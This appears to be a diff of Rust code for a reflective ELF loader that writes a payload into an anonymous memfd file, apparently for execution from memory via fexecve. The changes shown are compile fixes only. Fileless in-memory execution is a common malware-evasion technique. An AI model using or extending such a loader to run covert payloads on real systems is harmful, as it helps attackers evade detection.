@@ -1,7 +1,6 @@
 use anyhow::{anyhow, Result};
 use libc::{c_char, c_int, close, fexecve, MFD_CLOEXEC};
 use std::ffi::CString;
-use std::os::unix::io::AsRawFd;
 
 #[link(name = "c")]
 extern "C" {
@@ -20,8 +19,10 @@ impl ReflectiveLoader {
     pub fn create_memfd(&mut self, name: &str) -> Result<c_int> {
         let cname = CString::new(name)
             .map_err(|e| anyhow!("Failed to create CString: {}", e))?;
+        // MFD_CLOEXEC is often u32 in libc, but memfd_create takes int
+        let flags = MFD_CLOEXEC as c_int;
         let fd = unsafe {
-            memfd_create(cname.as_ptr(), MFD_CLOEXEC)
+            memfd_create(cname.as_ptr(), flags)
         };
         if fd < 0 {
             return Err(anyhow!("Failed to create memfd: {}", std::io::Error::last_os_error()));
@@ -29,12 +30,13 @@ impl ReflectiveLoader {
         self.fd = Some(fd);
         Ok(fd)
     }
-    
+
     pub fn write_payload(&self, fd: c_int, payload: &[u8]) -> Result<()> {
         use std::os::unix::io::FromRawFd;
         use std::fs::File;
+        use std::io::Write; // Import Write trait for write_all
         let mut file = unsafe { File::from_raw_fd(fd) };
-        std::io::Write::write_all(&mut file, payload)
+        file.write_all(payload)
             .map_err(|e| anyhow!("Failed to write payload: {}", e))?;
         std::mem::forget(file); // Prevent file from closing the fd on drop
         Ok(())
@@ -91,7 +93,7 @@ impl ElfLoader {
     pub fn new(payload: Vec<u8>) -> Self {
         ElfLoader { payload }
     }
-    
+
     pub fn validate_elf(&self) -> Result<()> {
         if self.payload.len() < 64 {
             return Err(anyhow!("Payload too short to be ELF"));
@@ -104,7 +106,7 @@ impl ElfLoader {
         }
         Ok(())
     }
-    
+
     pub fn get_entry_point(&self) -> Result<u64> {
         if self.payload.len() < 64 {
             return Err(anyhow!("Payload too short"));
